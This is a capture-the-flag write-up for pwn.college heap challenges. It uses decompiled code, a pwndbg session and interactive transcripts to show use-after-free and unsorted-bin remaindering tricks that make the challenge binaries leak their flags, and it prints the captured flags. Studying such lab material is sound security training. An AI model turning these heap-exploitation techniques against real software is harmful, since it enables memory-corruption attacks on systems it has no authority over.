---
custom_edit_url: null
sidebar_position: 3
slug: /pwn-college/program-security/dynamic-allocator-misuse
---

## Freebie (Easy)

```
hacker@dynamic-allocator-misuse~freebie-easy:~$ /challenge/freebie-easy 
###
### Welcome to /challenge/freebie-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): 
```

The program uses a memory space of 292 bytes to read the flag.

```
[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(292)
[*] flag_buffer = 0x5633693962c0
[*] read the flag!
```

But it SEGFAULTs when we try the `puts` command.

```
[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: Segmentation fault
```

### Binary analysis

Let's look at the code.

```c title="/challenge/freebie-easy :: main() :: Pseudocode :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char s1[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v10; // [rsp+D8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = nullptr;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          print_TCACHE(main_thread_TCACHE);
          puts(byte_2419);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2419);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2419);
          size = atoi(s1);
          printf("[*] allocations[%d] = malloc(%d)\n", 0, size);
          ptr = malloc(size);
          printf("[*] allocations[%d] = %p\n", 0, ptr);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("[*] free(allocations[%d])\n", 0);
        free(ptr);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("[*] puts(allocations[%d])\n", 0);
      printf("Data: ");
      puts((const char *)ptr);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 0; ++i )
    {
      printf("[*] flag_buffer = malloc(%d)\n", 292);
      size_4 = malloc(292u);
      printf("[*] flag_buffer = %p\n", size_4);
    }
    v3 = open("/flag", 0);
    read(v3, size_4, 0x80u);
    puts("[*] read the flag!");
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

### Use-After-Free

We can leverage a UAF vulnerability here, where we allocate 292 bytes of memory using `malloc`, and then free it using the `free` command.
It is important that we allocate the same number of bytes that the `read_flag` function uses, otherwise it will use another Tcache bin.

#### Tcache Binning
The heap allocator (GLIBC) doesn't just throw all freed memory into one big pile. It organizes freed chunks into "bins" based on their size.
- A chunk of `128` bytes goes into Bin `#7`.
- A chunk of `292` bytes goes into Bin `#17`.

When the program calls `malloc(N)`, the allocator only looks in the bin that matches size `N`.

We then use `read_flag` to instruct the program to read the flag next it will read it to the same location where the first allocated memory was, because that pointer is not cleared.
Next, when we use `puts`, the program will print the data pointed to by the original pointer. However, since we read the flag to that location, the flag will be printed.

Alternatively, we can also `malloc` a huge bin so that we do not have to worry about the specific size, but we will leverage that in another challenge.

### Exploit

```
hacker@dynamic-allocator-misuse~freebie-easy:~$ /challenge/freebie-easy 
###
### Welcome to /challenge/freebie-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 292

[*] allocations[0] = malloc(292)
[*] allocations[0] = 0x5c1c841ef2c0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #17     | SIZE: 281 - 296        | COUNT: 1     | HEAD: 0x5c1c841ef2c0       | KEY: 0x5c1c841ef010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5c1c841ef2c0      | 0                   | 0x131 (P)                    | (nil)               | 0x5c1c841ef010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(292)
[*] flag_buffer = 0x5c1c841ef2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{84MQn7Xg8iltuVV7AxkYMfwzHrQ.0VM3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebie (Hard)

```
hacker@dynamic-allocator-misuse~freebie-hard:~$ /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

This time the program does not tell us how many bytes the `read_flag` function is allocating. We need to know this so that we can use the same number of bytes in our `malloc`.

- [ ] Size allocated for `read_flag`

### Binary Analysis

```c title="/challenge/freebie-hard :: main() :: Pseudocode :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char s1[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v10; // [rsp+D8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = nullptr;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts(byte_2020);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2020);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2020);
          size = atoi(s1);
          ptr = malloc(size);
        }
        if ( strcmp(s1, "free") )
          break;
        free(ptr);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("Data: ");
      puts((const char *)ptr);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 0; ++i )
      size_4 = malloc(262u);
    v3 = open("/flag", 0);
    read(v3, size_4, 0x80u);
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

We can see, that on selecting `read_flag`, a bin of 262 is allocated using `malloc()`.
For paractice, let's find out how we can discovert the same using GDB.

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000000012a9 <+0>:     endbr64
   0x00000000000012ad <+4>:     push   rbp
   0x00000000000012ae <+5>:     mov    rbp,rsp
   0x00000000000012b1 <+8>:     sub    rsp,0xe0
   0x00000000000012b8 <+15>:    mov    DWORD PTR [rbp-0xc4],edi
   0x00000000000012be <+21>:    mov    QWORD PTR [rbp-0xd0],rsi
   0x00000000000012c5 <+28>:    mov    QWORD PTR [rbp-0xd8],rdx
   0x00000000000012cc <+35>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000012d5 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000012d9 <+48>:    xor    eax,eax
   0x00000000000012db <+50>:    mov    rax,QWORD PTR [rip+0x2d3e]        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x00000000000012e2 <+57>:    mov    ecx,0x0
   0x00000000000012e7 <+62>:    mov    edx,0x2
   0x00000000000012ec <+67>:    mov    esi,0x0
   0x00000000000012f1 <+72>:    mov    rdi,rax
   0x00000000000012f4 <+75>:    call   0x1180 <setvbuf@plt>
   0x00000000000012f9 <+80>:    mov    rax,QWORD PTR [rip+0x2d10]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x0000000000001300 <+87>:    mov    ecx,0x1
   0x0000000000001305 <+92>:    mov    edx,0x2
   0x000000000000130a <+97>:    mov    esi,0x0
   0x000000000000130f <+102>:   mov    rdi,rax
   0x0000000000001312 <+105>:   call   0x1180 <setvbuf@plt>
   0x0000000000001317 <+110>:   lea    rdi,[rip+0xcea]        # 0x2008
   0x000000000000131e <+117>:   call   0x1120 <puts@plt>
   0x0000000000001323 <+122>:   mov    rax,QWORD PTR [rbp-0xd0]
   0x000000000000132a <+129>:   mov    rax,QWORD PTR [rax]
   0x000000000000132d <+132>:   mov    rsi,rax
   0x0000000000001330 <+135>:   lea    rdi,[rip+0xcd5]        # 0x200c
   0x0000000000001337 <+142>:   mov    eax,0x0
   0x000000000000133c <+147>:   call   0x1140 <printf@plt>
   0x0000000000001341 <+152>:   lea    rdi,[rip+0xcc0]        # 0x2008
   0x0000000000001348 <+159>:   call   0x1120 <puts@plt>
   0x000000000000134d <+164>:   mov    edi,0xa
   0x0000000000001352 <+169>:   call   0x1110 <putchar@plt>
   0x0000000000001357 <+174>:   mov    QWORD PTR [rbp-0x98],0x0
   0x0000000000001362 <+185>:   mov    QWORD PTR [rbp-0xa0],0x106
   0x000000000000136d <+196>:   lea    rdi,[rip+0xcac]        # 0x2020
   0x0000000000001374 <+203>:   call   0x1120 <puts@plt>
   0x0000000000001379 <+208>:   lea    rdi,[rip+0xca8]        # 0x2028
   0x0000000000001380 <+215>:   mov    eax,0x0
   0x0000000000001385 <+220>:   call   0x1140 <printf@plt>
   0x000000000000138a <+225>:   lea    rax,[rbp-0x90]
   0x0000000000001391 <+232>:   mov    rsi,rax
   0x0000000000001394 <+235>:   lea    rdi,[rip+0xcbe]        # 0x2059
   0x000000000000139b <+242>:   mov    eax,0x0
   0x00000000000013a0 <+247>:   call   0x11b0 <__isoc99_scanf@plt>
   0x00000000000013a5 <+252>:   lea    rdi,[rip+0xc74]        # 0x2020
   0x00000000000013ac <+259>:   call   0x1120 <puts@plt>
   0x00000000000013b1 <+264>:   lea    rax,[rbp-0x90]
   0x00000000000013b8 <+271>:   lea    rsi,[rip+0xca0]        # 0x205f
   0x00000000000013bf <+278>:   mov    rdi,rax
   0x00000000000013c2 <+281>:   call   0x1160 <strcmp@plt>
   0x00000000000013c7 <+286>:   test   eax,eax
   0x00000000000013c9 <+288>:   jne    0x1446 <main+413>
   0x00000000000013cb <+290>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x00000000000013d5 <+300>:   lea    rdi,[rip+0xc8a]        # 0x2066
   0x00000000000013dc <+307>:   mov    eax,0x0
   0x00000000000013e1 <+312>:   call   0x1140 <printf@plt>
   0x00000000000013e6 <+317>:   lea    rax,[rbp-0x90]
   0x00000000000013ed <+324>:   mov    rsi,rax
   0x00000000000013f0 <+327>:   lea    rdi,[rip+0xc62]        # 0x2059
   0x00000000000013f7 <+334>:   mov    eax,0x0
   0x00000000000013fc <+339>:   call   0x11b0 <__isoc99_scanf@plt>
   0x0000000000001401 <+344>:   lea    rdi,[rip+0xc18]        # 0x2020
   0x0000000000001408 <+351>:   call   0x1120 <puts@plt>
   0x000000000000140d <+356>:   lea    rax,[rbp-0x90]
   0x0000000000001414 <+363>:   mov    rdi,rax
   0x0000000000001417 <+366>:   call   0x11a0 <atoi@plt>
   0x000000000000141c <+371>:   mov    DWORD PTR [rbp-0xac],eax
   0x0000000000001422 <+377>:   mov    eax,DWORD PTR [rbp-0xac]
   0x0000000000001428 <+383>:   mov    rdi,rax
   0x000000000000142b <+386>:   call   0x1170 <malloc@plt>
   0x0000000000001430 <+391>:   mov    rdx,rax
   0x0000000000001433 <+394>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x0000000000001439 <+400>:   mov    QWORD PTR [rbp+rax*8-0x98],rdx
   0x0000000000001441 <+408>:   jmp    0x136d <main+196>
   0x0000000000001446 <+413>:   lea    rax,[rbp-0x90]
   0x000000000000144d <+420>:   lea    rsi,[rip+0xc19]        # 0x206d
   0x0000000000001454 <+427>:   mov    rdi,rax
   0x0000000000001457 <+430>:   call   0x1160 <strcmp@plt>
   0x000000000000145c <+435>:   test   eax,eax
   0x000000000000145e <+437>:   jne    0x1485 <main+476>
   0x0000000000001460 <+439>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x000000000000146a <+449>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x0000000000001470 <+455>:   mov    rax,QWORD PTR [rbp+rax*8-0x98]
   0x0000000000001478 <+463>:   mov    rdi,rax
   0x000000000000147b <+466>:   call   0x1100 <free@plt>
   0x0000000000001480 <+471>:   jmp    0x136d <main+196>
   0x0000000000001485 <+476>:   lea    rax,[rbp-0x90]
   0x000000000000148c <+483>:   lea    rsi,[rip+0xbdf]        # 0x2072
   0x0000000000001493 <+490>:   mov    rdi,rax
   0x0000000000001496 <+493>:   call   0x1160 <strcmp@plt>
   0x000000000000149b <+498>:   test   eax,eax
   0x000000000000149d <+500>:   jne    0x14d5 <main+556>
   0x000000000000149f <+502>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x00000000000014a9 <+512>:   lea    rdi,[rip+0xbc7]        # 0x2077
   0x00000000000014b0 <+519>:   mov    eax,0x0
   0x00000000000014b5 <+524>:   call   0x1140 <printf@plt>
   0x00000000000014ba <+529>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x00000000000014c0 <+535>:   mov    rax,QWORD PTR [rbp+rax*8-0x98]
   0x00000000000014c8 <+543>:   mov    rdi,rax
   0x00000000000014cb <+546>:   call   0x1120 <puts@plt>
   0x00000000000014d0 <+551>:   jmp    0x136d <main+196>
   0x00000000000014d5 <+556>:   lea    rax,[rbp-0x90]
   0x00000000000014dc <+563>:   lea    rsi,[rip+0xb9b]        # 0x207e
   0x00000000000014e3 <+570>:   mov    rdi,rax
   0x00000000000014e6 <+573>:   call   0x1160 <strcmp@plt>
   0x00000000000014eb <+578>:   test   eax,eax
   0x00000000000014ed <+580>:   jne    0x1554 <main+683>
   0x00000000000014ef <+582>:   mov    DWORD PTR [rbp-0xb4],0x0
   0x00000000000014f9 <+592>:   jmp    0x1518 <main+623>
   0x00000000000014fb <+594>:   mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000001502 <+601>:   mov    rdi,rax
   0x0000000000001505 <+604>:   call   0x1170 <malloc@plt>
   0x000000000000150a <+609>:   mov    QWORD PTR [rbp-0xa8],rax
   0x0000000000001511 <+616>:   add    DWORD PTR [rbp-0xb4],0x1
   0x0000000000001518 <+623>:   cmp    DWORD PTR [rbp-0xb4],0x0
   0x000000000000151f <+630>:   jle    0x14fb <main+594>
   0x0000000000001521 <+632>:   mov    esi,0x0
   0x0000000000001526 <+637>:   lea    rdi,[rip+0xb5b]        # 0x2088
   0x000000000000152d <+644>:   mov    eax,0x0
   0x0000000000001532 <+649>:   call   0x1190 <open@plt>
   0x0000000000001537 <+654>:   mov    ecx,eax
   0x0000000000001539 <+656>:   mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000001540 <+663>:   mov    edx,0x80
   0x0000000000001545 <+668>:   mov    rsi,rax
   0x0000000000001548 <+671>:   mov    edi,ecx
   0x000000000000154a <+673>:   call   0x1150 <read@plt>
   0x000000000000154f <+678>:   jmp    0x136d <main+196>
   0x0000000000001554 <+683>:   lea    rax,[rbp-0x90]
   0x000000000000155b <+690>:   lea    rsi,[rip+0xb2c]        # 0x208e
   0x0000000000001562 <+697>:   mov    rdi,rax
   0x0000000000001565 <+700>:   call   0x1160 <strcmp@plt>
   0x000000000000156a <+705>:   test   eax,eax
   0x000000000000156c <+707>:   je     0x157c <main+723>
   0x000000000000156e <+709>:   lea    rdi,[rip+0xb1e]        # 0x2093
   0x0000000000001575 <+716>:   call   0x1120 <puts@plt>
   0x000000000000157a <+721>:   jmp    0x157d <main+724>
   0x000000000000157c <+723>:   nop
   0x000000000000157d <+724>:   lea    rdi,[rip+0xb24]        # 0x20a8
   0x0000000000001584 <+731>:   call   0x1120 <puts@plt>
   0x0000000000001589 <+736>:   mov    eax,0x0
   0x000000000000158e <+741>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000001592 <+745>:   xor    rcx,QWORD PTR fs:0x28
   0x000000000000159b <+754>:   je     0x15a2 <main+761>
   0x000000000000159d <+756>:   call   0x1130 <__stack_chk_fail@plt>
   0x00000000000015a2 <+761>:   leave
   0x00000000000015a3 <+762>:   ret
End of assembler dump.
```

The second `malloc`, at `main+604` is what is called when we use the `read_flag` command. We can tell that it is the second one and not the first call to `malloc` at `main+386`, because the first one takes another input, which is the size of memory to be allocated. So the first call to `malloc` happens when we use the `malloc` command.

Let's put a breakpoint and run.

```
pwndbg> break *(main+604)
Breakpoint 1 at 0x1505
```

```
pwndbg> run
Starting program: /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag


Breakpoint 1, 0x00005eab712ba505 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────
 RAX  0x106
 RBX  0x5eab712ba5b0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7b84ab44a297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x106
 RSI  0x5eab712bb07e ◂— 'read_flag'
 R8   1
 R9   0x7ffffff8
 R10  0x7fffffff
 R11  0x246
 R12  0x5eab712ba1c0 (_start) ◂— endbr64 
 R13  0x7ffc52383440 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc52383350 ◂— 0
 RSP  0x7ffc52383270 ◂— 0
 RIP  0x5eab712ba505 (main+604) ◂— call malloc@plt
───────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
 ► 0x5eab712ba505 <main+604>    call   malloc@plt                  <malloc@plt>
        size: 0x106
 
   0x5eab712ba50a <main+609>    mov    qword ptr [rbp - 0xa8], rax
   0x5eab712ba511 <main+616>    add    dword ptr [rbp - 0xb4], 1
   0x5eab712ba518 <main+623>    cmp    dword ptr [rbp - 0xb4], 0
   0x5eab712ba51f <main+630>    jle    main+594                    <main+594>
 
   0x5eab712ba521 <main+632>    mov    esi, 0                 ESI => 0
   0x5eab712ba526 <main+637>    lea    rdi, [rip + 0xb5b]     RDI => 0x5eab712bb088 ◂— 0x75710067616c662f /* '/flag' */
   0x5eab712ba52d <main+644>    mov    eax, 0                 EAX => 0
   0x5eab712ba532 <main+649>    call   open@plt                    <open@plt>
 
   0x5eab712ba537 <main+654>    mov    ecx, eax
   0x5eab712ba539 <main+656>    mov    rax, qword ptr [rbp - 0xa8]
────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc52383270 ◂— 0
01:0008│-0d8 0x7ffc52383278 —▸ 0x7ffc52383458 —▸ 0x7ffc52384691 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0d0 0x7ffc52383280 —▸ 0x7ffc52383448 —▸ 0x7ffc52384679 ◂— '/challenge/freebie-hard'
03:0018│-0c8 0x7ffc52383288 ◂— 0x100000000
04:0020│-0c0 0x7ffc52383290 ◂— 0
... ↓        3 skipped
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5eab712ba505 main+604
   1   0x7b84ab360083 __libc_start_main+243
   2   0x5eab712ba1ee _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Size allocated for `read_flag`: `262`

### Exploit

```
hacker@dynamic-allocator-misuse~freebie-hard:~$ /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 262


[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{I2KyXNxk50mkShkCYeSWWeQnub9.0lM3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebin Feint (Easy)

```
hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
###
### Welcome to /challenge/freebin-feint-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee2c0
[*] read the flag!
```

### Binary analysis

```c title="/challenge/freebie-feint-easy :: main() :: Pseudocode :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  size_t v8; // [rsp+40h] [rbp-A0h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char s1[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v11; // [rsp+D8h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = nullptr;
  v8 = rand() % 872 + 128;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          print_TCACHE(main_thread_TCACHE);
          puts(byte_2441);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2441);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_2441);
          size = atoi(s1);
          printf("[*] allocations[%d] = malloc(%d)\n", 0, size);
          ptr = malloc(size);
          printf("[*] allocations[%d] = %p\n", 0, ptr);
        }
        if ( strcmp(s1, "free") )
          break;
        printf("[*] free(allocations[%d])\n", 0);
        free(ptr);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("[*] puts(allocations[%d])\n", 0);
      printf("Data: ");
      puts((const char *)ptr);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 0; ++i )
    {
      printf("[*] flag_buffer = malloc(%d)\n", v8);
      size_4 = malloc(v8);
      printf("[*] flag_buffer = %p\n", size_4);
    }
    v3 = open("/flag", 0);
    read(v3, size_4, 0x80u);
    puts("[*] read the flag!");
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

This challenge is very similar to the previous one, only difference being that the size of the `flag_buffer` is arbitrary this time. So we have to allocate the same size when we use `malloc`.

### Exploit

```
hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
###
### Welcome to /challenge/freebin-feint-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 991

[*] allocations[0] = malloc(991)
[*] allocations[0] = 0x582868eee6b0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #61     | SIZE: 985 - 1000       | COUNT: 1     | HEAD: 0x582868eee6b0       | KEY: 0x582868eee010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x582868eee6b0      | 0                   | 0x3f1 (P)                    | (nil)               | 0x582868eee010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee6b0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{YmZfwVA6aurOwPF9E1iE4IdM40I.01M3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebin Feint (Hard)

```
hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
###
### Welcome to /challenge/freebin-feint-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x6241860a12a0

[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

### Binary analysis

```c title="/challenge/freebie-feint-hard :: main() :: Pseudocode :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  size_t v8; // [rsp+40h] [rbp-A0h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char s1[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v11; // [rsp+D8h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 1u);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = nullptr;
  v8 = rand() % 872 + 128;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts(byte_204E);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", s1);
          puts(byte_204E);
          if ( strcmp(s1, "malloc") )
            break;
          printf("Size: ");
          __isoc99_scanf("%127s", s1);
          puts(byte_204E);
          size = atoi(s1);
          ptr = malloc(size);
          printf("[*] allocations[%d] = %p\n", 0, ptr);
        }
        if ( strcmp(s1, "free") )
          break;
        free(ptr);
      }
      if ( strcmp(s1, "puts") )
        break;
      printf("Data: ");
      puts((const char *)ptr);
    }
    if ( strcmp(s1, "read_flag") )
      break;
    for ( i = 0; i <= 0; ++i )
    {
      size_4 = malloc(v8);
      printf("[*] flag_buffer = %p\n", size_4);
    }
    v3 = open("/flag", 0);
    read(v3, size_4, 0x80u);
  }
  if ( strcmp(s1, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

Again, the `flag_buffer` is some arbitrary size.
In order to solve this challenge, we have to leverage Remaindering.

This is the actual method to solve even the [easy version](#freebin-feint-easy). We were able to allocate the exact number of bytes in that challenge because the program printed that number then.

### Leveraging the unsorted bin / cache

Memory managers handle splitting large memory blocks from the "top chunk" (the largest free block) to satisfy smaller allocation requests, creating a smaller "remainder" block that stays available in the heap.

Instead of immediately putting newly freed chunks onto the correct bin, the heap manager coalesces it with neighbors, and dumps it onto a general unsorted linked list. During `malloc`, each item on the unsorted bin is checked to see if it “fits” the request. If it does, `malloc` can use it immediately. If it does not, `malloc` then puts the chunk into its corresponding small or large bin.

<figure style={{ textAlign: 'center' }}>
   <img alt="image" src="https://github.com/user-attachments/assets/f32f89e4-513f-47b9-80f3-8f781f4ebfb8" />
   <figcaption>Source: [Azeria labs](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)</figcaption>
</figure>

This only happens if the large bin / cache is used instead of Tcache to allocated memory. For that we have to allocate a chunk of size greater than 1032 bytes, as Tcache only handles memory allocation upto 1032 bytes.

Currently, the `ptmalloc` caching design is (in order of use):
- 64 singly-linked TCACHE bins for allocations of size 16 to 1032 (functionally "covers" fastbins and smallbins)
- 10 singly-linked "fast" bins for allocations of size up to 160 bytes
- 1 doubly-linked "unsorted" bin to quickly stash freed chunks that don't fit into TCACHE or fastbins
- 62 doubly-linked "small" bins for allocations up to 512 bytes
- 63 doubly-linked "large" bins (anything over 512 bytes) that contain different-sized chunks

So, if we allocate a large enough space, then free it, and then call the `read_flag` command, we would not have to worry about the size of `flag_buffer` because it will be split and used from our unsorted bin allocation.

### Exploit

```
hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
###
### Welcome to /challenge/freebin-feint-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 5000

[*] allocations[0] = 0x5618c504f2a0

[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x5618c504f2a0

[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{su9bnqD-UlklEnJ8xjHEtaBKtSJ.0FN3MDL4ITM0EzW}


